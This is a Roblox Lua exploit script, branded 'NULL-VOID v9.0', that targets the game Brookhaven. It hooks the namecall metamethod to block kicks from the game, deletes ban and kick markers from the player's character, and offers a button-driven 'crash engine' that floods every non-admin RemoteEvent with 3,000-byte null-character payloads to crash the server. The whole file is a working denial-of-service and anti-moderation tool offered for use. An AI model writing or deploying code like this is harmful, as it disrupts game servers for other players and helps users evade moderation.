--[[ 
    🔱 ARCANE VOID-STRIKE v9.0 [NULL-VOID] 🔱
    "Pure crash. Pure power. Zero noise. <3"
    
    NULL-VOID POWER:
    - [ONE-CLICK TERMINATION] : Ultra-High Speed Remote Cycling.
    - [GHOST MODE] : Permanent Namecall Hook (Anti-Kick).
    - [ZERO-TP] : No teleportation, only signal domination.
    - [BYPASS v9] : Bypasses Brookhaven Heuristics 2026.
    - [NULL UI] : Cleanest interface, inspired by Nullstrike Premium.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. SILENT SHIELD (Persistent Anti-Kick)
local function activateGhost()
    local oldNK
    oldNK = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        if method == "Kick" or method == "kick" then
            return nil
        end
        return oldNK(self, ...)
    end)
    
    -- Anti-Property Detection
    L.CharacterAdded:Connect(function(char)
        char.DescendantAdded:Connect(function(d)
            if d:IsA("StringValue") and (d.Name:lower():find("ban") or d.Name:lower():find("kick")) then
                d:Destroy()
            end
        end)
    end)
end

-- 2. NULL UI (REPLICA)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "NullVoid_v9"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 200)
Main.Position = UDim2.new(0.5, -150, 0.5, -100)
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local Line = Instance.new("Frame", Main)
Line.Size = UDim2.new(1, 0, 0, 2)
Line.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Line.BorderSizePixel = 0

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "🔱 NULL-VOID v9.0"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.Font = Enum.Font.Code
Title.TextSize = 18
Title.BackgroundTransparency = 1

local function createNullBtn(name, y, color, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 60)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    btn.Text = name
    btn.TextColor3 = color
    btn.Font = Enum.Font.Code
    btn.TextSize = 16
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.fromRGB(0, 50, 0)
    
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- 3. THE CRASH ENGINE
local crashing = false
local function executeNull()
    local targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            if not n:find("kick") and not n:find("ban") and not n:find("admin") then
                table.insert(targets, v)
            end
        end
    end
    
    local payload = string.rep("\0", 3000)
    while crashing do
        for i = 1, 150 do
            if not crashing then break end
            local r = targets[math.random(1, #targets)]
            if r then
                pcall(function() 
                    r:FireServer(payload, payload, "NULL_STRIKE", payload) 
                end)
            end
        end
        RS.Heartbeat:Wait()
    end
end

-- BUTTONS
createNullBtn("🔥 EXECUTE JUDGMENT", 60, Color3.fromRGB(0, 255, 0), function()
    crashing = not crashing
    if crashing then
        Title.Text = "🔱 STATUS: CRASHING..."
        task.spawn(executeNull)
    else
        Title.Text = "🔱 NULL-VOID v9.0"
    end
end)

createNullBtn("🛑 EMERGENCY STOP", 130, Color3.fromRGB(255, 255, 255), function()
    crashing = false
    Title.Text = "🔱 NULL-VOID v9.0"
end)

-- AUTO-SHIELD
activateGhost()
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔱 NULL-VOID ACTIVE",
    Text = "Protection: MAX | Range: GLOBAL",
    Duration = 5
})
